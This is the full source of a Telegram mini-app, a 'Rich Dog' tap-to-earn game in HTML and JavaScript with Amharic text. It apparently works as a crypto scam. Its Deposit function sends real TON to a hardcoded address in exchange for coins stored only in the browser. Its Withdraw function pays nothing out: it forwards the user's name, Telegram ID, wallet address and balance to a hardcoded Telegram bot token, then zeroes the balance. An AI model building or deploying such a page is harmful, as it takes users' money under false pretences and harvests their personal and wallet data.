<!DOCTYPE html>  
<html lang="am">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
    <title>Rich Dog Pro</title>  
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>  
    <script src="https://telegram.org/js/telegram-web-app.js"></script>  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">  
    <style>  
        :root { --primary: #f1c40f; --bg: #0a0b10; --card: #1c1e26; --accent: #27ae60; }  
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }  
          
        /* Top Bar */  
        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; z-index: 10; }  
        .top-btn { background: var(--card); border: none; color: white; width: 45px; height: 45px; border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; cursor: pointer; }  
        .deposit-btn { background: var(--accent); color: white; font-weight: bold; width: auto; padding: 0 15px; border-radius: 15px; display: flex; align-items: center; gap: 8px; border: none; cursor: pointer; }  
  
        /* Main Game Area */  
        .game-content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-bottom: 80px; width: 100%; }  
        .balance-amount { font-size: 3.5rem; font-weight: 800; color: var(--primary); text-shadow: 0 0 20px rgba(241, 196, 15, 0.4); margin-bottom: 10px; }  
          
        #dog-character { width: 240px; height: 240px; border-radius: 50%; border: 6px solid var(--card); box-shadow: 0 0 50px rgba(241, 196, 15, 0.2); transition: transform 0.1s; }  
        #dog-character:active { transform: scale(0.95); }  
  
        /* Withdraw Card */  
        .airdrop-card { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid var(--primary); width: 85%; max-width: 320px; text-align: center; }  
        .claim-btn { background: var(--primary); color: black; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }  
  
        /* Bottom Nav */  
        .bottom-nav { display: grid; grid-template-columns: repeat(5, 1fr); background: var(--card); padding: 12px 0; border-radius: 25px 25px 0 0; position: fixed; bottom: 0; width: 100%; z-index: 100; }  
        .nav-link { background: none; border: none; color: #888; font-size: 0.65rem; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }  
        .nav-link.active { color: var(--primary); }  
        .nav-link i { font-size: 1.2rem; }  
  
        .hidden { display: none !important; }  
        #ton-connect-btn { display: none; }  
    </style>  
</head>  
<body>  
  
    <div class="top-nav">  
        <button class="top-btn" onclick="alert('Settings coming soon!')"><i class="fas fa-cog"></i></button>  
        <button class="deposit-btn" onclick="buyCoins()">  
            <span>Deposit</span> <i class="fas fa-plus-circle"></i>  
        </button>  
    </div>  
  
    <div id="home-page" class="game-content">  
        <div class="balance-amount">💰 <span id="balance">0</span></div>  
        <img id="dog-character" src="https://raw.githubusercontent.com/abduluazizhussein-ctrl/black-site/main/dog.png" alt="Rich Dog">  
        <p style="color: #555; margin-top: 15px;">Rich Dog Community</p>  
    </div>  
  
    <div id="airdrop-page" class="game-content hidden">  
        <h2 style="color: var(--primary);">🚀 Withdraw TON</h2>  
        <div class="airdrop-card">  
            <i class="fas fa-wallet" style="font-size: 3rem; color: var(--primary); margin-bottom: 10px;"></i>  
            <h3>Withdraw TON</h3>  
            <p style="color: #aaa; font-size: 0.8rem;">ዝቅተኛው የክፍያ መጠን 0.25 TON (10,000 Coins) ነው።</p>  
            <button class="claim-btn" onclick="handleWithdraw()">Connect & Withdraw</button>  
        </div>  
    </div>  
  
    <nav class="bottom-nav">  
        <button class="nav-link active" id="nav-home" onclick="showTab('home')">  
            <i class="fas fa-home"></i><span>Home</span>  
        </button>  
        <button class="nav-link" onclick="alert('Spin coming soon!')">  
            <i class="fas fa-sync-alt"></i><span>Spin</span>  
        </button>  
        <button class="nav-link" onclick="inviteFriends()">  
            <i class="fas fa-user-plus"></i><span>Friends</span>  
        </button>  
        <button class="nav-link" onclick="window.open('https://t.me/AzizAfarBot')">  
            <i class="fas fa-tasks"></i><span>Tasks</span>  
        </button>  
        <button class="nav-link" id="nav-airdrop" onclick="showTab('airdrop')">  
            <i class="fas fa-parachute-box"></i><span>Withdraw</span>  
        </button>  
    </nav>  
  
    <div id="ton-connect-btn"></div>  
  
    <script>  
        let tele = window.Telegram?.WebApp;  
        if(tele) { tele.expand(); tele.ready(); tele.headerColor = '#0a0b10'; }  
  
        let balance = localStorage.getItem('rich_balance') === null ? 500 : parseInt(localStorage.getItem('rich_balance'));  
  
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({  
            manifestUrl: 'https://abduluazizhussein-ctrl.github.io/black-site/tonconnect-manifest.json',  
            buttonRootId: 'ton-connect-btn'  
        });  
  
        function updateUI() {  
            document.getElementById('balance').innerText = balance.toLocaleString();  
            localStorage.setItem('rich_balance', balance);  
        }  
  
        function showTab(tab) {  
            document.getElementById('home-page').classList.add('hidden');  
            document.getElementById('airdrop-page').classList.add('hidden');  
            document.getElementById(tab + '-page').classList.remove('hidden');  
            document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));  
            document.getElementById('nav-' + tab).classList.add('active');  
        }  
  
        async function buyCoins() {  
            if (!tonConnectUI.connected) { await tonConnectUI.connectWallet(); return; }  
            const transaction = {  
                validUntil: Math.floor(Date.now() / 1000) + 60,  
                messages: [{ address: "TGxSZwwKVmhMzaC6x5MxpUQss84XnjdXdR", amount: "500000000" }]  
            };  
            try {  
                await tonConnectUI.sendTransaction(transaction);  
                balance += 5000; updateUI();  
                alert("ግዢው ተሳክቷል!");  
            } catch (e) { alert("ክፍያው አልተሳካም!"); }  
        }  
  
        async function handleWithdraw() {  
            if (!tonConnectUI.connected) { await tonConnectUI.connectWallet(); return; }  
              
            const minAmount = 10000;   
            if (balance < minAmount) {  
                alert("ስህተት: ለማውጣት ቢያንስ 10,000 Coins (0.25 TON) ያስፈልግዎታል!");  
                return;  
            }  
  
            // --- የተስተካከለ Bot Info ---  
            const botToken = "8269565802:AAH80pcceZonFiX2B4gUiCC0mtb7osyZBqU";   
            const chatId = "8105159131";   
            const wallet = tonConnectUI.account.address;  
            const message = `🚀 *New Withdraw Request!*\n\n👤 User: ${tele.initDataUnsafe.user?.first_name || 'Guest'}\n💰 Coins: ${balance}\n💎 Wallet: \`${wallet}\`\n🆔 User ID: ${tele.initDataUnsafe.user?.id || 'N/A'}`;  
  
            try {  
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);  
                if (response.ok) {  
                    alert("የማውጣት ጥያቄዎ ለባለቤቱ ተልኳል! በ 24 ሰዓት ውስጥ ይገመገማል።");  
                    balance = 0;   
                    updateUI();  
                } else {  
                    alert("ጥያቄውን መላክ አልተቻለም። ቦቱን መጀመሪያ @Aziz_afarbot ላይ Start ማለታችሁን አረጋግጡ።");  
                }  
            } catch (e) { alert("Network Error! Please try again later."); }  
        }  
  
        function inviteFriends() {  
            const url = "https://t.me/Aziz_afarbot/richdog";  
            tele.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=Join Rich Dog and Earn Coins!`);  
            balance += 200; updateUI();  
        }  
  
        updateUI();  
    </script>  
</body>  
  </html>
